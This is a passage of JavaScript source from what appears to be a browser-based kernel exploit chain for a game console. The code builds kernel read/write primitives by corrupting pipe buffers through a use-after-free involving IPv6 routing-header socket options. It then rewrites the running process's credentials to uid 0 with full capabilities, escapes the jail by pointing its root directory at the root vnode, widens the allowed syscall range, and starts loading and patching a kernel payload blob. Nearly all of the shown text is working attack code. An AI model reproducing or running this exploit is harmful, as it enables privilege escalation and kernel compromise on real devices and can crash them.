    if (t1.j >= 0) TW.S.triplets[1] = t1.j;
    await H.waitFinished(S.uioWriteGroup, PK.WAIT_DEADLINE_MS, "kwrite-tail");

    await runBuilt("kwrite-tail-w", () => {
      armRet(1);
      emit(PSYS.WRITE, retPtr(0), S.iovSockB, b.scratchBig.base, 1);
    });
    const t2 = await TW.findTriplet(TW.S.triplets[0], TW.S.triplets[1], {
      attempts: PK.FIND_TRIPLET_FAST,
      deadlineMs: o.repairDeadlineMs || 20000,
    });
    if (t2.j >= 0) TW.S.triplets[2] = t2.j;
    await H.waitFinished(S.iovGroup, PK.WAIT_DEADLINE_MS, "kwrite-tail");
    await readReleaseByte("kwrite-tail-r");

    out.ok = true;
    flushMark(
      "KWRITE-OK",
      "kaddr=" +
        hx(kaddr) +
        "-size=" +
        size +
        "-loopA=" +
        out.loopA +
        "-loopB=" +
        out.loopB +
        "-triplets=" +
        TW.S.triplets.join("."),
    );
    return out;
  }

  async function corruptPipebuf(cnt, inOff, outOff, sizeField, bufferPtr) {
    const b = S.buf;
    const u8 = b.pipebuf.u8;
    w32(u8, 0x00, cnt >>> 0);
    w32(u8, 0x04, inOff >>> 0);
    w32(u8, 0x08, outOff >>> 0);
    w32(u8, 0x0c, sizeField >>> 0);
    w64(u8, 0x10, bufferPtr);
    await runBuilt("pipebuf", () => {
      armRet(2);
      emit(PSYS.WRITE, retPtr(0), S.masterWfd, b.pipebuf.base, PK.PIPEBUF_SIZE);
      emit(PSYS.READ, retPtr(1), S.masterRfd, b.pipebuf.base, PK.PIPEBUF_SIZE);
    });
    return { w: retOf(0), r: retOf(1) };
  }

  async function kreadFast(src, destBuf, n) {
    await corruptPipebuf(n, 0, 0, PK.PIPE_PAGE_SIZE, src);
    await runBuilt("kread-fast", () => {
      armRet(1);
      emit(PSYS.READ, retPtr(0), S.victimRfd, destBuf.base, n);
    });
    return retOf(0);
  }

  async function kwriteFast(dest, srcBuf, n) {
    await corruptPipebuf(0, 0, 0, PK.PIPE_PAGE_SIZE, dest);
    await runBuilt("kwrite-fast", () => {
      armRet(1);
      emit(PSYS.WRITE, retPtr(0), S.victimWfd, srcBuf.base, n);
    });
    S.kernelWrites++;
    return retOf(0);
  }

  async function kread64Fast(addr) {
    const b = S.buf;
    for (let i = 0; i < 8; ++i) b.rwScratch.u8[i] = 0xee;
    const r = await kreadFast(addr, b.rwScratch, 8);
    return { ret: r, v: r64(b.rwScratch.u8, 0) };
  }
  async function kread32Fast(addr) {
    const b = S.buf;
    for (let i = 0; i < 4; ++i) b.rwScratch.u8[i] = 0xee;
    const r = await kreadFast(addr, b.rwScratch, 4);
    return { ret: r, v: r32(b.rwScratch.u8, 0) >>> 0 };
  }
  async function kwrite64Fast(addr, v) {
    const b = S.buf;
    w64(b.rwScratch.u8, 0, v);
    return await kwriteFast(addr, b.rwScratch, 8);
  }
  async function kwrite32Fast(addr, v) {
    const b = S.buf;
    w32(b.rwScratch.u8, 0, v >>> 0);
    return await kwriteFast(addr, b.rwScratch, 4);
  }

  async function fgetFast(fd) {
    return await kread64Fast(S.fdOfiles.add32(fd * PK.OFF.FILEDESCENT_SIZE));
  }

  async function fholdFast(fp) {
    const countAddr = fp.add32(PK.OFF.FILE_F_COUNT);
    const before = await kread32Fast(countAddr);
    if (before.ret !== 4) return { ok: false, why: "f_count read short" };
    const next = (before.v + 1) >>> 0;
    await kwrite32Fast(countAddr, next);
    const after = await kread32Fast(countAddr);
    return {
      ok: after.v === next,
      before: before.v,
      after: after.v,
    };
  }

  async function findCurproc() {
    const b = S.buf;

    const pidR = await sys(PSYS.GETPID);
    if (pidR.failed || pidR.s32 <= 0)
      return { ok: false, why: "getpid failed: " + pidR.errText };
    const pid = pidR.s32;

    w32(b.pipefd.u8, 0, 0);
    w32(b.pipefd.u8, 4, 0);
    const pr = await sys(PSYS.PIPE2, b.pipefd.base, 0);
    if (pr.failed)
      return { ok: false, why: "pipe2 for sigio failed: " + pr.errText };
    const rfd = r32(b.pipefd.u8, 0) | 0,
      wfd = r32(b.pipefd.u8, 4) | 0;
    if (rfd < 0 || wfd < 0)
      return { ok: false, why: "pipe2 gave " + rfd + "," + wfd };
    try {
      w32(b.rwScratch.u8, 0, pid);
      let own = await sys(
        PSYS.IOCTL,
        rfd,
        i64(PK.FIOSETOWN, 0),
        b.rwScratch.base,
      );
      let how = "ioctl(FIOSETOWN)";
      if (own.failed) {
        const alt = await sys(PSYS.FCNTL, rfd, PK.F_SETOWN, pid);
        if (!alt.failed) {
          own = alt;
          how = "fcntl(F_SETOWN)";
        }
      }
      if (own.failed)
        return {
          ok: false,
          why:
            "ioctl(FIOSETOWN) and " +
            "fcntl(F_SETOWN) both failed (" +
            own.errText +
            ")",
        };
      queueEvent("SIGIO-OWNER", "via=" + how + "-fd=" + rfd + "-pid=" + pid);

      const fp = await fgetFast(rfd);
      if (!isKernelPtr(fp.v)) return { ok: false, why: "sigio fp " + hx(fp.v) };
      const fdata = await kread64Fast(fp.v.add32(PK.OFF.FILE_F_DATA));
      if (!isKernelPtr(fdata.v))
        return { ok: false, why: "sigio f_data " + hx(fdata.v) };
      const sigio = await kread64Fast(fdata.v.add32(PK.OFF.PIPE_SIGIO));
      if (!isKernelPtr(sigio.v))
        return {
          ok: false,
          why:
            "pipe_sigio " +
            hx(sigio.v) +
            " not installed at +0x" +
            PK.OFF.PIPE_SIGIO.toString(16),
        };
      const proc = await kread64Fast(sigio.v.add32(PK.OFF.SIGIO_PROC));
      if (!isKernelPtr(proc.v))
        return { ok: false, why: "curproc " + hx(proc.v) };
      return { ok: true, curproc: proc.v, pid };
    } finally {
      await runBuilt("sigio-pipe-close", () => {
        armRet(2);
        emit(PSYS.CLOSE, retPtr(0), wfd);
        emit(PSYS.CLOSE, retPtr(1), rfd);
      });
    }
  }

  async function removeRthrFromSocket(idx) {
    const fd = bankFd(idx);
    const fp = await fgetFast(fd);
    if (!isKernelPtr(fp.v))
      return { ok: false, why: "fd " + fd + " fp=" + hx(fp.v) };
    const fdata = await kread64Fast(fp.v.add32(PK.OFF.FILE_F_DATA));
    if (!isKernelPtr(fdata.v))
      return { ok: false, why: "fd " + fd + " f_data=" + hx(fdata.v) };
    const pcb = await kread64Fast(fdata.v.add32(PK.OFF.SOCKET_SO_PCB));
    if (!isKernelPtr(pcb.v))
      return { ok: false, why: "fd " + fd + " so_pcb=" + hx(pcb.v) };
    const opts = await kread64Fast(pcb.v.add32(PK.OFF.INPCB_PKTOPTS));
    if (!isKernelPtr(opts.v))
      return { ok: false, why: "fd " + fd + " in6p_outputopts=" + hx(opts.v) };
    const target = opts.v.add32(PK.OFF.IP6PO_RTHDR);
    const was = await kread64Fast(target);
    await kwrite64Fast(target, i64(0, 0));
    const now = await kread64Fast(target);
    const ok = isZero64(now.v);
    flushMark(
      "RTHDR-REMOVED",
      "idx=" +
        idx +
        "-fd=" +
        fd +
        "-ip6po_rthdr=" +
        hx(target) +
        "-was=" +
        hx(was.v) +
        "-now=" +
        hx(now.v) +
        "-ok=" +
        ok,
    );
    return { ok, was: was.v };
  }

  async function removeUafFile() {
    if (S.uafSock === undefined || S.uafSock < 0)
      return { ok: false, why: "no uaf socket recorded" };
    const uafFp = await fgetFast(S.uafSock);
    flushMark("UAF-FILE", "uaf_sock=" + S.uafSock + "-fp=" + hx(uafFp.v));
    if (!isKernelPtr(uafFp.v))
      return { ok: false, why: "uaf fp=" + hx(uafFp.v) };
    const zero = i64(0, 0);
    await kwrite64Fast(
      S.fdOfiles.add32(S.uafSock * PK.OFF.FILEDESCENT_SIZE), zero
    );

    let removed = 0, scanned = 0;
    const deadline = Date.now() + 15000;
    for (let i = 0; i < 0x400 && removed < 3; ++i) {
      if (Date.now() > deadline) {
        queueEvent("UAF-FILE-DEADLINE", "scanned=" + scanned
          + "-removed=" + removed + "-of-3");
        break;
      }
      scanned++;
      const sr = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
      if (sr.failed || sr.s32 < 0) break;
      const s = sr.s32;
      const fp = await fgetFast(s);
      if (fp.v.low === uafFp.v.low && fp.v.hi === uafFp.v.hi) {
        await kwrite64Fast(
          S.fdOfiles.add32(s * PK.OFF.FILEDESCENT_SIZE), zero
        );
        removed++;
      }
      await sys(PSYS.CLOSE, s);
    }
    flushMark("UAF-FILE-REMOVED", "removed=" + removed + "-scanned=" + scanned);
    return { ok: true, removed };
  }

  async function stage3(opts) {
    const wasRace = setRaceMode(true);
    try {
      return await stage3Body(opts);
    } finally {
      setRaceMode(wasRace);
    }
  }

  async function stage3Body(opts) {
    const o = opts || {}, b = S.buf;
    const out = {
      ok: false, why: "", steps: [], rw: false, readTest: null,
      writeTest: null, cleanup: {}
    };
    if (!S.masterPipeData || !S.victimPipeData) {
      out.why = "stage 3 needs stage 2's pipe pointers";
      return out;
    }
    if (!S.fdOfiles) {
      out.why = "stage 3 needs fdt_ofiles";
      return out;
    }
    if (!TW.tripletsValid()) {
      out.why = "stage 3 needs three live aliases; triplets="
        + TW.S.triplets.join(",");
      return out;
    }
    const pb = b.pipebuf.u8;
    w32(pb, 0x00, 0);
    w32(pb, 0x04, 0);
    w32(pb, 0x08, 0);
    w32(pb, 0x0c, PK.PIPE_PAGE_SIZE);
    w64(pb, 0x10, S.victimPipeData);
    flushMark(
      "STAGE3-CORRUPT-PRE",
      "master_pipe=" + hx(S.masterPipeData) + "-victim_pipe="
        + hx(S.victimPipeData) + "-size=0x"
        + PK.PIPE_PAGE_SIZE.toString(16)
    );
    flushQueueSoft();
    const kw = await kwriteSlow(S.masterPipeData, pb, PK.PIPEBUF_SIZE, o);
    out.steps.push("kwrite_slow(master_pipe_data)="
      + (kw.ok ? "ok" : "FAILED: " + kw.why));
    if (!kw.ok) {
      out.why = "pipebuf write failed: " + kw.why;
      return out;
    }
    let verified = false, sawv = null;
    for (let i = 0; i < 3 && !verified; ++i) {
      const v = await kread64Fast(S.masterPipeData.add32(0x10));
      sawv = v.v;
      verified = v.v.low === S.victimPipeData.low
        && v.v.hi === S.victimPipeData.hi;
    }
    out.steps.push("verify master_pipe+0x10=" + hx(sawv)
      + (verified ? " == victim_pipe"
        : " != victim_pipe " + hx(S.victimPipeData)));
    if (!verified) {
      out.why = "master_pipe+0x10 reads " + hx(sawv) + ", expected "
        + hx(S.victimPipeData) + "; fast primitive not live";
      flushMark("STAGE3-VERIFY-FAILED", out.why.slice(0, 150));
      return out;
    }
    out.rw = true;
    flushMark("STAGE3-RW", "master_pipe+0x10=" + hx(sawv));

    const fpAddr = S.fdOfiles.add32(S.masterRfd * PK.OFF.FILEDESCENT_SIZE);
    const fastFp = await kread64Fast(fpAddr);
    const crossOk = fastFp.ret === 8 && fastFp.v.low === S.masterFp.low
      && fastFp.v.hi === S.masterFp.hi;
    out.readTest = {
      cross: {
        addr: hx(fpAddr), fast: hx(fastFp.v), slow: hx(S.masterFp),
        pass: crossOk
      }
    };
    out.steps.push("read test A (cross-primitive) " + hx(fpAddr)
      + ": fast=" + hx(fastFp.v) + " slow=" + hx(S.masterFp)
      + (crossOk ? " AGREE" : " DISAGREE"));
    flushMark(
      "STAGE3-READTEST-CROSS",
      "addr=" + hx(fpAddr) + "-fast=" + hx(fastFp.v) + "-slow="
        + hx(S.masterFp) + "-pass=" + crossOk
    );
    if (!crossOk) {
      out.why = "read test failed: fast reads " + hx(fastFp.v) + " at "
        + hx(fpAddr) + ", kread_slow read " + hx(S.masterFp);
      return out;
    }
    const cp = await findCurproc();
    if (cp.ok) {
      S.curproc = cp.curproc;
      const kpid = await kread32Fast(cp.curproc.add32(PK.OFF.PROC_PID));
      const pidOk = kpid.v === cp.pid;
      out.readTest.pid = {
        curproc: hx(cp.curproc), kernelPid: kpid.v, userlandPid: cp.pid,
        pass: pidOk
      };
      out.steps.push("read test B (pid) curproc=" + hx(cp.curproc)
        + " p_pid=" + kpid.v + " getpid()=" + cp.pid
        + (pidOk ? " MATCH" : " MISMATCH"));
      flushMark(
        "STAGE3-READTEST-PID",
        "curproc=" + hx(cp.curproc) + "-p_pid=" + kpid.v + "-getpid="
          + cp.pid + "-pass=" + pidOk
      );
      if (!pidOk) {
        out.why = "read test B failed: curproc->p_pid reads " + kpid.v
          + " but getpid() says " + cp.pid + "; suspect +0x"
          + PK.OFF.PROC_PID.toString(16) + " or the sigio walk";
        return out;
      }
    } else {
      out.readTest.pid = { skipped: cp.why };
      out.steps.push("pid read test skipped: " + cp.why + " (test A passed)");
      flushMark("STAGE3-READTEST-PID-SKIP", cp.why.slice(0, 140));
    }
    const fps = [];
    for (const fd of [S.masterRfd, S.masterWfd, S.victimRfd, S.victimWfd]) {
      const fp = await fgetFast(fd);
      if (!isKernelPtr(fp.v)) {
        out.why = "fhold: fd " + fd + " fp=" + hx(fp.v);
        return out;
      }
      fps.push({ fd, fp: fp.v });
    }
    const h0 = await fholdFast(fps[0].fp);
    out.writeTest = {
      fd: fps[0].fd, fp: hx(fps[0].fp), before: h0.before,
      after: h0.after, pass: !!h0.ok
    };
    out.steps.push("write test f_count(fd " + fps[0].fd + ") "
      + h0.before + " -> " + h0.after + (h0.ok ? " MATCH" : " MISMATCH"));
    flushMark(
      "STAGE3-WRITETEST",
      "fd=" + fps[0].fd + "-fp=" + hx(fps[0].fp) + "-before="
        + h0.before + "-after=" + h0.after + "-pass=" + h0.ok
    );
    if (!h0.ok) {
      out.why = "write test failed: f_count " + h0.before + " -> " + h0.after
        + ", expected " + ((h0.before + 1) >>> 0) + "; writes not landing";
      return out;
    }
    for (let i = 1; i < fps.length; ++i) await fholdFast(fps[i].fp);
    out.steps.push("fhold: 4/4 pipe files held");
    const rr = [];
    for (let s = 0; s < 3; ++s) {
      const r = await removeRthrFromSocket(TW.S.triplets[s]);
      rr.push(r.ok);
      out.steps.push("remove_rthr(triplets[" + s + "]=" + TW.S.triplets[s]
        + ")=" + (r.ok ? "ok" : "FAILED: " + r.why));
    }
    out.cleanup.rthdrCleared = rr.filter(Boolean).length;
    if (out.cleanup.rthdrCleared === 3) {
      TW.clearCorrupt("three ip6po_rthdr pointers zeroed; "
        + "no socket aliases the chunk");
    }
    let burnedFixed = 0;
    for (const idx of TW.S.burned.slice()) {
      const r = await removeRthrFromSocket(idx);
      if (r.ok) burnedFixed++;
    }
    out.cleanup.burnedCleared = burnedFixed;
    out.cleanup.burnedTotal = TW.S.burned.length;
    const aliasesRepaired = out.cleanup.rthdrCleared === 3
      && burnedFixed === TW.S.burned.length;
    if (aliasesRepaired) {
      S.aliasesRepaired = true;
      flushMark(
        "ALIASES-REPAIRED",
        "triplet=3-burned=" + burnedFixed + "-of-" + TW.S.burned.length
      );
    }
    if (TW.S.burned.length) {
      out.steps.push("remove_rthr on " + burnedFixed + "/"
        + TW.S.burned.length + " burned socket(s)");
    }
    const uf = await removeUafFile();
    out.cleanup.uafRemoved = uf.ok ? uf.removed : -1;
    out.steps.push("remove_uaf_file="
      + (uf.ok ? uf.removed + " slot(s)" : "FAILED: " + uf.why));
    out.ok = true;
    flushMark(
      "STAGE3-DONE",
      "rw=1-readTest=pass-writeTest=pass-rthdrCleared="
        + out.cleanup.rthdrCleared + "-uafRemoved=" + out.cleanup.uafRemoved
        + "-kernelWrites=" + S.kernelWrites
    );
    return out;
  }

  async function kreadRetry32(addr) {
    let r = null;
    for (let i = 0; i < PK.KREAD_RETRIES; ++i) {
      r = await kread32Fast(addr);
      if (r.ret === 4) return r;
    }
    return r;
  }
  async function kreadRetry64(addr) {
    let r = null;
    for (let i = 0; i < PK.KREAD_RETRIES; ++i) {
      r = await kread64Fast(addr);
      if (r.ret === 8) return r;
    }
    return r;
  }

  async function findProcByPid(startProc, link, want, trace) {
    const t = trace || {};
    t.hops = 0;
    t.badPid = 0;
    t.why = "";
    let p = startProc;
    for (let i = 0; i < PK.INIT_WALK_MAX; ++i) {
      t.hops = i;
      if (isZero64(p) || !isKernelPtr(p)) {
        t.why = "left the list at " + hx(p);
        return null;
      }
      const pid = await kreadRetry32(p.add32(PK.OFF.PROC_PID));
      if (pid.ret === 4 && pid.v === want) return p;
      if (pid.ret !== 4) t.badPid++;
      const nxt = await kreadRetry64(p.add32(link));
      if (nxt.ret !== 8) {
        t.why = "link +0x" + link.toString(16) + " unreadable at " + hx(p);
        return null;
      }
      p = nxt.v;
    }
    t.why = "exhausted " + PK.INIT_WALK_MAX + " links";
    return null;
  }

  async function getAllproc() {
    if (S.allproc) return { ok: true, addr: S.allproc, cached: true };
    const cand = await findAllproc();
    if (!cand) return { ok: false, why: "not reachable from curproc" };
    const av = await validateAllproc(cand.addr);
    flushMark(
      "ALLPROC-CHECK",
      "cand=" +
        hx(cand.addr) +
        "-hops=" +
        cand.hops +
        "-ok=" +
        av.ok +
        "-procs=" +
        av.procs +
        "-self=" +
        av.sawSelf +
        "-pid=" +
        av.self +
        (av.ok ? "" : "-why=" + String(av.why).slice(0, 80)),
    );
    if (!av.ok)
      return { ok: false, why: hx(cand.addr) + " failed pfind: " + av.why };
    S.allproc = cand.addr;
    return { ok: true, addr: cand.addr, hops: cand.hops, procs: av.procs };
  }

  async function findRootvnode() {
    const fwd = {},
      bwd = { why: "not attempted (walk starts at *allproc)" };
    const ap = await getAllproc();
    if (!ap.ok) return { ok: false, why: "allproc: " + ap.why };
    const head = await kreadRetry64(ap.addr);
    if (head.ret !== 8 || !isKernelPtr(head.v) || isZero64(head.v))
      return { ok: false, why: "*allproc = " + hx(head.v) };
    const init = await findProcByPid(head.v, 0x00, PK.KERNEL_PID, fwd);
    if (!init) {
      flushMark(
        "STAGE4-KPROC-WALK-FAIL",
        "fwd=" +
          fwd.why +
          "-hops=" +
          fwd.hops +
          "-badPid=" +
          fwd.badPid +
          "-allproc=" +
          hx(ap.addr),
      );
      return {
        ok: false,
        why:
          "kernel proc pid " +
          PK.KERNEL_PID +
          " not found from *allproc " +
          hx(ap.addr) +
          ": " +
          fwd.why +
          " after " +
          fwd.hops +
          " hops (" +
          fwd.badPid +
          " unreadable p_pid)",
      };
    }
    const initFd = await kreadRetry64(init.add32(PK.OFF.PROC_FD));
    if (initFd.ret !== 8 || !isKernelPtr(initFd.v))
      return { ok: false, why: "kernel proc p_fd = " + hx(initFd.v) };

    const rv = await kreadRetry64(initFd.v.add32(PK.OFF.FD_CDIR));
    if (rv.ret !== 8 || !isKernelPtr(rv.v))
      return {
        ok: false,
        why: "rootvnode = " + hx(rv.v) + " is not canonical",
      };
    return { ok: true, init, initFd: initFd.v, rootvnode: rv.v };
  }

  async function stage4(opts) {
    const wasRace = setRaceMode(true);
    try {
      return await stage4Body(opts);
    } finally {
      setRaceMode(wasRace);
    }
  }

  async function stage4Body(opts) {
    const out = { ok: false, why: "", steps: [], escaped: false, before: {}, after: {}, };

    if (!S.aliasesRepaired) {
      out.why = "stage 3 repair not certified"; return out;
    }
    if (!S.curproc || !isKernelPtr(S.curproc)) {
      out.why = "stage 4 needs curproc; have " + hx(S.curproc); return out;
    }

    const fdR = await kread64Fast(S.curproc.add32(PK.OFF.PROC_FD));
    if (fdR.ret !== 8 || !isKernelPtr(fdR.v)) {
      out.why = "curproc->p_fd = " + hx(fdR.v); return out;
    }
    const procFd = fdR.v;
    const ucR = await kread64Fast(S.curproc.add32(PK.OFF.PROC_UCRED));
    if (ucR.ret !== 8 || !isKernelPtr(ucR.v)) {
      out.why = "curproc->p_ucred = " + hx(ucR.v); return out;
    }
    const ucred = ucR.v;
    out.steps.push("curproc=" + hx(S.curproc) + " p_fd=" + hx(procFd)
      + " p_ucred=" + hx(ucred));

    const rv = await findRootvnode();
    if (!rv.ok) {
      out.why = "rootvnode: " + rv.why; return out;
    }
    out.steps.push("init=" + hx(rv.init) + " init_fd=" + hx(rv.initFd)
      + " rootvnode=" + hx(rv.rootvnode));

    const uid0 = await kread32Fast(ucred.add32(PK.OFF.UCRED_CR_UID));
    if (uid0.ret !== 4) {
      out.why = "cannot read cr_uid"; return out;
    }
    out.before.uid = uid0.v;
    const attrs0 = await kread64Fast(ucred.add32(PK.OFF.UCRED_ATTRS_QWORD));
    if (attrs0.ret !== 8) {
      out.why = "cannot read cr_sceAttrs"; return out;
    }
    out.steps.push("before: cr_uid=" + uid0.v + " attrs_qword=" + hx(attrs0.v));

    flushMark("STAGE4-PRE", "curproc=" + hx(S.curproc) + "-ucred=" + hx(ucred)
      + "-p_fd=" + hx(procFd) + "-rootvnode=" + hx(rv.rootvnode)
      + "-uid=" + uid0.v + "-writes=begin");

    await kwrite32Fast(ucred.add32(PK.OFF.UCRED_CR_UID), 0);
    await kwrite32Fast(ucred.add32(PK.OFF.UCRED_CR_RUID), 0);
    await kwrite32Fast(ucred.add32(PK.OFF.UCRED_CR_SVUID), 0);
    await kwrite32Fast(ucred.add32(PK.OFF.UCRED_CR_NGROUPS), 1);
    await kwrite32Fast(ucred.add32(PK.OFF.UCRED_CR_RGID), 0);
    await kwrite32Fast(ucred.add32(PK.OFF.UCRED_CR_SVGID), 0);
    out.steps.push("cr_uid/ruid/svuid=0, ngroups=1, rgid/svgid=0");

    const attrs = i64(((attrs0.v.low & 0x00ffffff) >>> 0) | 0x80000000,
      attrs0.v.hi,);
    await kwrite64Fast(ucred.add32(PK.OFF.UCRED_ATTRS_QWORD), attrs);
    out.steps.push("cr_sceAttrs byte=0x80 (RMW)");

    await kwrite64Fast(ucred.add32(PK.OFF.UCRED_CR_SCEAUTHID),
      i64(PK.SYSCORE_AUTHID_LO, PK.SYSCORE_AUTHID_HI),);
    await kwrite64Fast(ucred.add32(PK.OFF.UCRED_CR_SCECAPS0),
      i64(0xffffffff, 0xffffffff),);
    await kwrite64Fast(ucred.add32(PK.OFF.UCRED_CR_SCECAPS1),
      i64(0xffffffff, 0xffffffff),);
    out.steps.push("cr_sceAuthID=0x" + PK.SYSCORE_AUTHID_HI.toString(16)
      + PK.SYSCORE_AUTHID_LO.toString(16).padStart(8, "0") + " (SYSCORE)"
      + ", cr_sceCaps[0..1]=all");

    await kwrite64Fast(procFd.add32(PK.OFF.FD_CDIR), rv.rootvnode);
    await kwrite64Fast(procFd.add32(PK.OFF.FD_RDIR), rv.rootvnode);
    await kwrite64Fast(procFd.add32(PK.OFF.FD_JDIR), i64(0, 0));
    out.steps.push("fd_cdir/fd_rdir = rootvnode " + hx(rv.rootvnode) + ", fd_jdir = 0");
    S.kernelWrites += 0;

    const dl = await kread64Fast(S.curproc.add32(PK.OFF.PROC_DYNLIB));
    if (dl.ret === 8 && isKernelPtr(dl.v)) {
      await kwrite64Fast(dl.v.add32(PK.OFF.DYNLIB_SC_START), i64(0, 0));
      await kwrite64Fast(dl.v.add32(PK.OFF.DYNLIB_SC_END),
        i64(0xffffffff, 0xffffffff),);
      out.steps.push("p_dynlib=" + hx(dl.v) + " syscall range widened to everything");

      S.dynlibUnrestricted = false;
      S.dlsymEnabled = false;
      out.dlsymEnabled = false;
      flushMark("STAGE4-DYNLIB-SAFE",
        "syscall-range-only=1-module-pointers-untouched=1-dlsym-required=0",);
    } else {
      out.steps.push("p_dynlib=" + hx(dl.v)
        + " not canonical; syscall range and dlsym NOT widened");
    }
    flushMark("STAGE4-DYNLIB",
      "p_dynlib=" + hx(dl.v) + "-dlsymEnabled=" + !!out.dlsymEnabled,);

    const uid1 = await kread32Fast(ucred.add32(PK.OFF.UCRED_CR_UID));
    const rdir = await kread64Fast(procFd.add32(PK.OFF.FD_RDIR));
    const jdir = await kread64Fast(procFd.add32(PK.OFF.FD_JDIR));
    const auth = await kread64Fast(ucred.add32(PK.OFF.UCRED_CR_SCEAUTHID));
    out.after = { uid: uid1.v, rdir: hx(rdir.v), jdir: hx(jdir.v), authid: hx(auth.v), };
    const sameRv = (v) => v.low === rv.rootvnode.low && v.hi === rv.rootvnode.hi;
    const uidOk = uid1.v === 0;
    const dirOk = sameRv(rdir.v) && isZero64(jdir.v);
    const authOk = auth.v.low === PK.SYSCORE_AUTHID_LO >>> 0
      && auth.v.hi === PK.SYSCORE_AUTHID_HI >>> 0;
    out.escaped = uidOk && dirOk;
    out.steps.push("after: cr_uid=" + uid1.v + " fd_rdir=" + hx(rdir.v)
      + " fd_jdir=" + hx(jdir.v) + " authid=" + hx(auth.v));
    flushMark("STAGE4-VERIFY", "uid=" + uid1.v + "-uidOk=" + uidOk
      + "-rdir=" + hx(rdir.v) + "-jdir=" + hx(jdir.v) + "-dirOk=" + dirOk
      + "-authid=" + hx(auth.v) + "-authOk=" + authOk,);

    if (!uidOk) {
      out.why = "cr_uid reads " + uid1.v + " after being written 0"; return out;
    }
    if (!dirOk) {
      out.why = "fd_rdir/fd_jdir did not read back as rootvnode " + hx(rv.rootvnode)
        + " (got " + hx(rdir.v) + " / " + hx(jdir.v) + "); uid 0 but still jailed";
      return out;
    }

    const gu = await sys(PSYS.GETUID);
    out.after.getuid = gu.failed ? -1 : gu.s32;
    const guOk = !gu.failed && gu.s32 === 0;
    out.steps.push("getuid() = " + out.after.getuid + (guOk ? " -- root" : ""));
    flushMark("STAGE4-GETUID", "getuid=" + out.after.getuid + "-pass=" + guOk);
    if (!guOk) {
      out.why = "cr_uid reads 0 " + "but getuid() returns " + out.after.getuid;
      return out;
    }

    S.jailbroken = true;
    out.ok = true;
    out.authOk = authOk;
    flushMark("STAGE4-DONE", "uid=0-getuid=0-rdir=jdir=rootvnode"
      + "-authid=" + hx(auth.v) + "-authOk=" + authOk
      + "-kernelWrites=" + S.kernelWrites,);
    return out;
  }

  async function findAllproc() {
    let p = S.curproc;
    for (let i = 0; i < PK.INIT_WALK_MAX; ++i) {
      if (!isKernelPtr(p)) return null;
      if (p.hi >>> 0 === 0xffffffff) return { addr: p, hops: i };
      const nxt = await kreadRetry64(p.add32(0x08));
      if (nxt.ret !== 8) return null;
      p = nxt.v;
    }
    return null;
  }

  async function validateAllproc(cand) {
    const r = {
      ok: false,
      why: "",
      procs: 0,
      sawInit: false,
      sawSelf: false,
      self: 0,
      first: null,
    };
    const pidR = await sys(PSYS.GETPID);
    if (pidR.failed || pidR.s32 <= 0) {
      r.why = "getpid failed: " + pidR.errText;
      return r;
    }
    r.self = pidR.s32;

    const first = await kread64Fast(cand);
    if (first.ret !== 8) {
      r.why = "*allproc unreadable";
      return r;
    }
    r.first = first.v;
    if (isZero64(first.v) || !isKernelPtr(first.v)) {
      r.why = "*allproc = " + hx(first.v) + " is not a proc pointer";
      return r;
    }

    if (first.v.hi >>> 0 === 0xffffffff) {
      r.why =
        "*allproc = " +
        hx(first.v) +
        " is not a heap address, " +
        "not a list head";
      return r;
    }

    let p = first.v;
    for (let i = 0; i < PK.INIT_WALK_MAX && !isZero64(p); ++i) {
      if (!isKernelPtr(p)) {
        r.why = "proc list reached " + hx(p);
        return r;
      }
      const pid = await kreadRetry32(p.add32(PK.OFF.PROC_PID));
      if (pid.ret !== 4) {
        r.why = "p_pid unreadable at " + hx(p);
        return r;
      }
      r.procs++;
      if (pid.v === 1) r.sawInit = true;
      if (pid.v === r.self) {
        r.sawSelf = true;
        r.ok = true;
        return r;
      }
      const nxt = await kreadRetry64(p.add32(0x00));
      if (nxt.ret !== 8) {
        r.why = "le_next unreadable at " + hx(p);
        return r;
      }
      p = nxt.v;
    }
    r.why =
      "walked " +
      r.procs +
      " procs from *allproc without reaching " +
      "self(" +
      r.self +
      ")";
    return r;
  }

  async function fetchInto(url, sink) {
    const r = await fetch(url, { cache: "no-store" });
    if (!r.ok) throw new Error("HTTP " + r.status);
    if (!r.body || typeof r.body.getReader !== "function") {
      const buf = new Uint8Array(await r.arrayBuffer()); sink(0, buf);
      return { total: buf.length, streamed: false, head: buf.slice(0, 4) };
    }
    const reader = r.body.getReader();
    let off = 0, head = null;
    for (;;) {
      const { done, value } = await reader.read();
      if (done) break;
      if (!value || !value.length) continue;
      if (head === null) head = value.slice(0, 4);
      sink(off, value); off += value.length;
    }
    return { total: off, streamed: true, head: head || new Uint8Array(0) };
  }

  function unpin(buf, why) {
    if (!buf || !buf.u8) return false;
    try {
      const g = P.nogc;
      if (!g || typeof g.indexOf !== "function") return false;
      const i = g.indexOf(buf.u8);
      if (i < 0) return false;
      g.splice(i, 1);
      queueEvent("ARENA-UNPINNED",
        buf.label + "-bytes=" + buf.bytes + "-why=" + why,);
      return true;
    } catch { return false; }
  }

  async function stage5(opts) {
    const wasRace = setRaceMode(false);
    try { return await stage5Body(opts); }
    finally { setRaceMode(wasRace); }
  }

  // Kit-only target_id exception. Ported from p2jb.js's kexp_maybe_keep_kit_id.
  //
  // The kexp blob HARD-OVERWRITES target_id = 0x82 at 0x3807, so a retail console
  // presents as a testkit. That is deliberate and REQUIRED: leaving a RETAIL console
  // with its own target_id sends downstream code onto a path it was never meant to run
  // and CAN PANIC THE KERNEL. An unconditional restore was shipped once and reverted.
  //
  // On a DEVKIT the forced 0x82 makes Release Check Mode read "Release": the testkit XML
  // entry for key 0x78020300 has no Development option, so a stored DEVELOPMENT
  // boot_param becomes unselectable, and 48 devkit-only settings go with it. NOPing the
  // overwrite keeps the console's own 0x81 and restores them.
  //
  // Gated on the LIVE target_id, never on the landing page's console-type picker: a
  // mis-picked "devkit" on a retail console is exactly the case that panics. A wrong
  // base, a missing profile value or a failed read all yield an id that is not 0x81 and
  // take the byte-identical stock path. ?keepkitid=0 disables, ?keepkitid=1 forces - and
  // the force is still gated on a kit-ish id, so it cannot keep a retail id.
  async function kexpMaybeKeepKitId(bin) {
    const q = String(location.search || "");
    const disabled = /[?&]keepkitid=0/i.test(q);
    const forced = /[?&]keepkitid=1/i.test(q);
    let tid = -1, why = "";
    try {
      if (PK.KERNEL_ALLPROC < 0 || PK.KERNEL_SECURITY_FLAGS <= 0) {
        why = "-no-kernel-globals-in-profile";
      } else {
        if (!S.allproc) { try { await getAllproc(); } catch (e) {} }
